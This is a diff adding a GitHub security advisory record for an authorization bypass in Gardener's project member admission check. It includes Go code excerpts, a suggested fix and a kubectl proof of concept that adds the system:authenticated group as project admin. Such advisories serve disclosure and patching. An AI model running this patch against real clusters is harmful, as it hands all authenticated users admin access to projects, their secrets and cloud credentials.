@@ -1,0 +1,103 @@
+{
+  "id": "GHSA-gfjv-gqf2-c888",
+  "modified": "2026-09-22T21:00:04.735782174Z",
+  "published": "2026-09-22T20:40:38Z",
+  "aliases": [
+    "CVE-2026-79767"
+  ],
+  "summary": "Gardener: Authorization Bypass via Group Subject Injection",
+  "details": "## Overview\nThe `manage-members` custom verb authorization check in the Gardener API server's `customverbauthorizer` admission plugin can be bypassed by adding `Group` or `ServiceAccount` subjects to a Project's member list. The check is documented as controlling \"human users or groups\", but the implementation only gates changes to `User`-kind subjects. A project admin (without `manage-members` permission) can add arbitrary Group subjects - including `system:authenticated` - granting all authenticated users full project-level access.\n## Technical Details\nThe official Gardener documentation at `docs/usage/project/projects.md:90-92` explicitly states:\n\u003cimg width=\"2090\" height=\"290\" alt=\"image\" src=\"https://github.com/user-attachments/assets/744f5d6f-1e03-47b5-9dc5-36f20b7e6f4b\" /\u003e\n\nHowever, the `mustCheckProjectMembers()` function at `admission.go` compares old and new member lists using `findHumanUsersWithRoles()`, which only tracks subjects where `isHumanUser()` returns true:\n```go\nfunc mustCheckProjectMembers(oldMembers, members []core.ProjectMember, owner *rbacv1.Subject, userInfo user.Info) bool {\n    if apiequality.Semantic.DeepEqual(oldMembers, members) {\n        return false\n    }\n    if userIsOwner(userInfo, owner) {\n        return false\n    }\n    var oldHumanUsers, newHumanUsers = findHumanUsersWithRoles(oldMembers), findHumanUsersWithRoles(members)\n    // ...\n    return !oldHumanUsers.Equal(newHumanUsers)\n}\n```\nThe `isHumanUser()` function at `admission.go` only matches `Kind == \"User\"`:\n```go\nfunc isHumanUser(subject rbacv1.Subject) bool {\n    return subject.Kind == rbacv1.UserKind \u0026\u0026 !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix)\n}\n```\nKind: \"Group\" subjects are NOT matched by `isHumanUser()`, making Group member changes invisible to the authorization check. \nA project admin without manage-members permission can freely add or remove Group members.\n\n## Steps to reproduce\n\u003cimg width=\"4322\" height=\"1395\" alt=\"image\" src=\"https://github.com/user-attachments/assets/60edacce-9810-4545-8198-a96cd072616c\" /\u003e\n\n---\n\n_Proof of concept:_\n1. Verify current project membership and confirm the owner has `manage-members` permission:\n```bash\n# Project members before the test:\n$ kubectl get project local -o yaml\n# members:\n#   - apiGroup: rbac.authorization.k8s.io\n#     kind: User\n#     name: admin-user\n#     role: admin\n#     roles:\n#     - owner\n\n# Confirm the owner CAN manage-members (expected)\n$ kubectl auth can-i manage-members projects.core.gardener.cloud/local --as=admin-user\nyes\n```\n2. Add a second admin user (`test-admin-user`) to the project WITHOUT the `uam` role, then confirm they lack `manage-members`:\n```bash\n# After adding test-admin-user as admin (no uam role):\n$ kubectl get project local -o yaml\n# members:\n#   - apiGroup: rbac.authorization.k8s.io\n#     kind: User\n#     name: admin-user\n#     role: admin\n#     roles:\n#     - owner\n#   - apiGroup: rbac.authorization.k8s.io\n#     kind: User\n#     name: test-admin-user\n#     role: admin\n\n# Confirm test-admin-user does NOT have manage-members\n$ kubectl auth can-i manage-members projects.core.gardener.cloud/local --as=test-admin-user\nno\n```\n3. Verify `test-admin-user` cannot add a human User member (the check works for Users):\n```bash\n$ kubectl patch --as=test-admin-user project local --type=merge -p '{\n  \"spec\": {\n    \"members\": [\n      {\n        \"kind\": \"User\",\n        \"apiGroup\": \"rbac.authorization.k8s.io\",\n        \"name\": \"new-human-user@example.com\",\n        \"role\": \"viewer\"\n      }\n    ]\n  }\n}'\nError from server (Forbidden): [projects.core.gardener.cloud](https://projects.core.gardener.cloud/) \"local\" is forbidden: user \"test-admin-user\" is not allowed to manage human users or groups in .spec.members for \"projects\"\n```\n4. Bypass the check by adding a Group subject instead:\n```bash\n# This should be denied but ISN'T - the manage-members check is bypassed\n$ kubectl patch project local --as=test-admin-user --type=json -p '[\n  {\n    \"op\": \"add\",\n    \"path\": \"/spec/members/-\",\n    \"value\": {\n      \"kind\": \"Group\",\n      \"apiGroup\": \"rbac.authorization.k8s.io\",\n      \"name\": \"system:authenticated\",\n      \"role\": \"admin\",\n      \"roles\": [\"admin\"]\n    }\n  }\n]'\n\nproject.core.gardener.cloud/local patched\n```\n5. Verify the Group was added to project members:\n```bash\n$ kubectl get project local -o yaml\n# members:\n#   - apiGroup: rbac.authorization.k8s.io\n#     kind: User\n#     name: admin-user\n#     role: admin\n#     roles:\n#     - owner\n#   - apiGroup: rbac.authorization.k8s.io\n#     kind: User\n#     name: test-admin-user\n#     role: admin\n#   - apiGroup: rbac.authorization.k8s.io\n#     kind: Group\n#     name: system:authenticated\n#     role: admin\n```\n6. Demonstrate the impact - any authenticated user now has project access:\n```bash\n# As a random user \n$ kubectl --as=random-user@example.com get shoots -n garden-local\nNAME    CLOUDPROFILE   PROVIDER   REGION   K8S VERSION   HIBERNATION   LAST OPERATION            STATUS    AGE\nlocal   local          local      local    1.35.0        Awake         Create Succeeded (100%)   healthy   30m\n```\n\u003e_Note: `random-user@example.com` does not exist as a real user. However, the Kubernetes `--as` global flag performs user impersonation which is treated as a successfully authenticated request, automatically adding the `system:authenticated` group. Since `system:authenticated` was added as a project admin member, this non-existent user now has full admin access to the project including all Shoots, Secrets, and cloud provider credentials._\n\n\n---\n## Security Impact\n- Unauthorized access expansion: A project admin can grant project-level access to ANY Kubernetes group, including `system:authenticated` (all authenticated users) or `system:unauthenticated` (all unauthenticated users).\n## Patching \u0026 Remediation\n1. **Fix `isHumanUser()` to include Groups**: The function should match the documented behavior. Change:\n    ```go\n    func isHumanUser(subject rbacv1.Subject) bool {\n        return subject.Kind == rbacv1.UserKind \u0026\u0026 !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix)\n    }\n    ```\n    To:\n    ```go\n    func isNonServiceAccountSubject(subject rbacv1.Subject) bool {\n        if subject.Kind == rbacv1.GroupKind {\n            return true\n        }\n        return subject.Kind == rbacv1.UserKind \u0026\u0026 !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix)\n    }\n    ```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gardener/gardener",
+        "purl": "pkg:golang/github.com/gardener/gardener"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.142.6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-gfjv-gqf2-c888/GHSA-gfjv-gqf2-c888.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "gardener/gardener",
+        "purl": "pkg:golang/gardener/gardener"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.143.0"
+            },
+            {
+              "fixed": "1.143.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-gfjv-gqf2-c888/GHSA-gfjv-gqf2-c888.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "gardener/gardener",
+        "purl": "pkg:golang/gardener/gardener"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.144.0"
+            },
+            {
+              "fixed": "1.144.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-gfjv-gqf2-c888/GHSA-gfjv-gqf2-c888.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gardener/gardener/security/advisories/GHSA-gfjv-gqf2-c888"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gardener/gardener/pull/15080"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gardener/gardener/commit/63751db97dca6cc5ee5f966d4963415de6ae5545"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gardener/gardener"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gardener/gardener/releases/tag/v1.144.2"
+    }
+  ]
+}
